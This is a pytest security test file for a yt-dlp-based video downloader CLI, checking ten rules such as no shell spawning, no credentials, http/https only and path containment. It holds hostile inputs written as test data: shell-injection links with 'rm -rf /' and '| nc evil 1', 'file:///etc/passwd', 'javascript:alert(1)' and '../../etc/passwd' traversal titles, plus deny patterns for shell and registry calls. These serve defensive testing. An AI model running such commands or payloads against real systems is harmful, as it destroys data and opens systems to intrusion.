"""The dedicated security test file (ticket #17).

One test per security rule, ten in total, plus the argument-injection
surface regression the spec asks for. The audit document that enumerates
the rules and names every covering test is ``docs/security-audit.md``.

Run the audit on its own:

    uv run pytest tests/test_security.py

It also runs as part of the normal suite, so CI re-proves every rule on
every push. The rules are numbered as in the spec's "Where each security
surface is tested" table; rules 4 and 8, which the table leaves implicit,
are named there for the first time.
"""

from __future__ import annotations

import re
import shutil
import subprocess
from pathlib import Path

import pytest

import vicxiun
from vicxiun import prereqs
from vicxiun.cli import main
from vicxiun.engine import _build_executor_options, _safe_default_options
from vicxiun.errors import (
    EXIT_CODE,
    PartialSuccess,
    PrerequisiteMissing,
    RefusedContent,
    UnexpectedFailure,
    UserError,
    exit_code_for,
)
from vicxiun.plan import (
    DownloadKind,
    Plan,
    profile_from_name,
    resolve_plan,
)

# The audit document the rule tests must stay in lockstep with.
_AUDIT_DOC = Path(__file__).resolve().parent.parent / "docs" / "security-audit.md"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _package_sources() -> dict[str, str]:
    """Return the source of every module in the ``vicxiun`` package."""
    root = Path(vicxiun.__file__).parent
    return {p.name: p.read_text(encoding="utf-8") for p in sorted(root.glob("*.py"))}


def _plan(tmp_path: Path, url: str = "https://example.com/v") -> Plan:
    """A minimal Download Plan for the option-composition assertions."""
    return Plan(
        url=url,
        kind=DownloadKind(),
        profile=profile_from_name("phone-safe"),
        format_description="MP4 H.264 + AAC, up to 1080p",
        target_path=tmp_path / "Chan" / "Title [id].mp4",
    )


def _strict_resolver(url: str) -> dict[str, object]:
    """A resolver that must never be reached for a rejected link."""
    raise AssertionError(f"the resolver was reached for a rejected link: {url}")


def _ok_resolver(url: str) -> dict[str, object]:
    """Metadata for the accepted-scheme cases; no network, no yt-dlp."""
    return {
        "title": "t",
        "uploader": "u",
        "ext": "mp4",
        "is_live": False,
        "format_description": "MP4 1080p",
        "video_id": "id",
    }


# ---------------------------------------------------------------------------
# The hostile surfaces (spec table, above the numbered rules)
# ---------------------------------------------------------------------------


def test_surface_argument_injection_never_reaches_a_shell() -> None:
    """A link beginning with ``-`` is never treated as one of our flags, and
    the table of hostile inputs is rejected with the user-error code. The
    engine calls yt-dlp's Python API rather than building a command line;
    this guard keeps that designed-out property from regressing: no module
    may spawn a shell, and the engine may not spawn anything at all.

    A bare ``&`` is absent from the table on purpose: it is URL data
    (ticket #26), and the source scan below is what proves no shell exists
    to interpret it."""
    hostile = (
        "-rf",
        "--verbose",
        "https://ex.com/$(touch x)",
        "https://ex.com/`id`",
        "https://ex.com/x;rm -rf /",
        "https://ex.com/ | nc evil 1",
        "https://ex.com/x > file",
    )
    for link in hostile:
        with pytest.raises(UserError):
            resolve_plan(
                link,
                profile=profile_from_name("phone-safe"),
                output_root=Path("/out"),
                resolver=_strict_resolver,
            )

    for name, source in _package_sources().items():
        assert "shell=True" not in source, f"{name} spawns a shell"
        assert "os.system" not in source, f"{name} uses os.system"
    engine_source = Path(vicxiun.__file__).parent / "engine.py"
    engine_text = engine_source.read_text(encoding="utf-8")
    assert "subprocess" not in engine_text, (
        "the engine must call yt-dlp's Python API, never a command line"
    )


# ---------------------------------------------------------------------------
# One test per security rule, ten in total
# ---------------------------------------------------------------------------


def test_rule_1_no_code_is_fetched_and_executed_at_runtime(tmp_path: Path) -> None:
    """Rule 1: the engine options never enable remote component fetching;
    the declared ``yt-dlp-ejs`` dependency is used instead (ADR-0004)."""
    assert not _safe_default_options().get("remote_components")
    assert not _build_executor_options(_plan(tmp_path), None).get("remote_components")


def test_rule_2_no_admin_rights_no_path_mutation_no_registry() -> None:
    """Rule 2: no administrator rights, ``PATH`` is never written, the
    Windows registry is never touched (user stories 39 and 40). The
    behavioural proof lives in ``test_prereqs.py``; this package-wide scan
    keeps every module subject to the same static guarantees."""
    for name, source in _package_sources().items():
        assert "winreg" not in source, f"{name} touches the registry"
        assert "ctypes" not in source, f"{name} could reach admin APIs"
        assert "IsUserAnAdmin" not in source, f"{name} checks for admin"
        assert "environ[" not in source, f"{name} writes os.environ"
        assert "putenv" not in source, f"{name} writes os.environ"


def test_rule_3_nothing_is_installed_silently(
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Rule 3: a missing Prerequisite spawns no subprocess; the exact
    install instruction is printed instead (ADR-0005, user story 37)."""

    def explode(*args: object, **kwargs: object) -> None:
        raise AssertionError("a subprocess was spawned by the Prereq check")

    monkeypatch.setattr(subprocess, "run", explode)
    monkeypatch.setattr(subprocess, "Popen", explode)
    monkeypatch.setattr(shutil, "which", lambda name: None)

    code = prereqs.run()

    assert code != 0
    printed = capsys.readouterr().err
    assert "ffmpeg" in printed
    assert "install" in printed.lower()


def test_rule_4_credentials_are_never_requested_or_stored(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Rule 4 (user story 44): the user's credentials are never requested
    or stored in this version. No credential option can be composed for
    the engine, no module mentions one, and the command line offers no
    way to supply one. Added by the audit: no test covered this before."""
    credential_keys = (
        "username",
        "password",
        "videopassword",
        "cookiefile",
        "cookiesfrombrowser",
    )
    options = _safe_default_options()
    options.update(_build_executor_options(_plan(tmp_path), None))
    for key in credential_keys:
        assert key not in options, f"the engine can be given {key}"

    for name, source in _package_sources().items():
        for needle in credential_keys:
            assert needle not in source, f"{name} mentions {needle}"

    with pytest.raises(SystemExit) as exit_info:
        main(["--help"])
    assert exit_info.value.code == 0
    help_text = capsys.readouterr().out
    for flag in ("--username", "--password", "--cookie"):
        assert flag not in help_text, f"the CLI offers {flag}"


def test_rule_5_only_http_and_https_links_are_accepted(tmp_path: Path) -> None:
    """Rule 5 (user story 42): the tool cannot be pointed at local files
    or other schemes; ``file://`` is in the rejection table."""
    for url in ("https://example.com/v", "http://example.com/v"):
        plan = resolve_plan(
            url,
            profile=profile_from_name("phone-safe"),
            output_root=tmp_path,
            resolver=_ok_resolver,
        )
        assert plan.url == url

    for url in (
        "file:///etc/passwd",
        "ftp://example.com/v",
        "javascript:alert(1)",
        "data:text/html,x",
        "smb://host/share",
        "//example.com/v",
    ):
        with pytest.raises(UserError):
            resolve_plan(
                url,
                profile=profile_from_name("phone-safe"),
                output_root=tmp_path,
                resolver=_strict_resolver,
            )


def test_rule_6_failures_are_never_swallowed() -> None:
    """Rule 6 (user story 36): every failure path yields a named error and
    a non-zero exit code; anything unnamed is still a non-zero "unexpected"
    code, never silence."""
    for exc_type in (
        UserError,
        PrerequisiteMissing,
        RefusedContent,
        PartialSuccess,
        UnexpectedFailure,
        KeyboardInterrupt,
    ):
        assert EXIT_CODE[exc_type] != 0, exc_type

    class SomethingUnplanned(RuntimeError):
        pass

    assert exit_code_for(SomethingUnplanned()) == 5

    from yt_dlp.utils import DownloadError

    from vicxiun.engine import _translate_download_error

    with pytest.raises((UserError, PrerequisiteMissing, RefusedContent)):
        _translate_download_error(DownloadError("something unclassifiable"))


def test_rule_7_no_telemetry(tmp_path: Path) -> None:
    """Rule 7 (user story 41): nothing about usage leaves the machine --
    yt-dlp's telemetry channel and self-update check are both disabled."""
    for options in (
        _safe_default_options(),
        _build_executor_options(_plan(tmp_path), None),
    ):
        assert options.get("enable_telemetry") is False
        assert options.get("updater") is False


def test_rule_8_a_hostile_title_cannot_write_outside_the_chosen_folder(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Rule 8 (user story 43): containment asserted *independently* of the
    sanitisation transform -- the sanitiser is replaced by the identity
    function, so the guarantee cannot silently depend on it. The transform
    itself is asserted separately, in ``test_paths.py`` and below."""
    import vicxiun.paths as paths_mod

    monkeypatch.setattr(paths_mod, "sanitize_filename", lambda s: s)
    for hostile in (
        "../../etc/passwd",
        "..\\..\\Windows",
        "/etc/passwd",
        "C:\\Windows\\System32",
        ".",
        "..",
        "",
        "a/b/../../../b",
    ):
        target = paths_mod.resolve_target(
            output_root=tmp_path,
            uploader="Chan",
            title=hostile,
            video_id="id",
            ext="mp4",
        )
        assert target.resolve().is_relative_to(tmp_path.resolve()), hostile


def test_rule_9_the_phone_safe_default_caps_resolution() -> None:
    """Rule 9 (ADR-0002): the phone-safe format options cap height at
    1080; ``--best`` is the only way past the cap."""
    assert "res:1080" in profile_from_name("phone-safe").format_sort
    assert "res:1080" not in profile_from_name("best").format_sort


def test_rule_10_every_rule_has_a_test() -> None:
    """Rule 10: the audit itself. Every numbered rule 1-9 has exactly one
    test in this file, the audit document names it, and the document gives
    the single command that runs the audit. Deleting a rule test or
    letting the document drift fails here."""
    rule_tests = sorted(name for name in globals() if name.startswith("test_rule_"))
    assert len(rule_tests) == 10, rule_tests

    text = _AUDIT_DOC.read_text(encoding="utf-8")
    for number in range(1, 10):
        names = [
            name for name in rule_tests if re.match(rf"test_rule_{number}_[a-z]", name)
        ]
        assert len(names) == 1, (number, names)
        assert names[0] in text, f"docs/security-audit.md does not name {names[0]}"
    assert "uv run pytest tests/test_security.py" in text
